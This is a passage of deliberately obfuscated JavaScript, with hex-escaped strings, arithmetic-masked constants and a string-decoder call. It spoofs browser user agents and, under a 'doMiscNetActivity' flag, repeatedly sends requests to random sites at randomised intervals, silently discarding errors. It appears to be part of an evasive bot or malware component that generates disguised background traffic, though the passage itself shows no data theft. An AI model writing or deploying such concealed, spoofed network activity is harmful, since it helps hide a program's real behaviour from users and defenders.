      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + a4(0x9, 'wE5p') + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x236d + -0x20a8 + 0x4415; k < -0x6 * 0x18d + 0x16d7 + -0xd85; k++)
    setTimeout(f, (0x145a5 + -0x1a2bf + -0x14e * -0xfb) * k * getRandomInt(-0xdd1 + 0xbbc + 0xb2 * 0x3, -0xf47 + -0x297 * -0xf + 0x25 * -0xa3));
  setInterval(() => {
    f();
    for (let l = 0x254 * 0x10 + -0x160 * -0x2 + -0x400 * 0xa; l < 0x10ca + 0x23cf + 0x7 * -0x783; l++)
      setTimeout(f, (-0x1d067 + -0x2 * 0x541b + 0x362fd) * l * getRandomInt(0x14e * -0x1 + 0xb02 + -0x1 * 0x9b3, 0x1184 + -0x27 * -0x76 + 0x237b * -0x1));
  }, -0xd196 * 0x44 + 0x4679c6 + 0x1 * 0x282092);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x3b * 0x9b + -0x6dd * -0x1 + 0x79f * -0x2) * getRandomInt(-0xd5 * 0x2b + -0x1aae + 0x3e76, 0x515 * -0x7 + 0x187 * -0x1 + 0x2db * 0xd));
}, 0x7e6 + -0x47c + -0x2b * 0x12);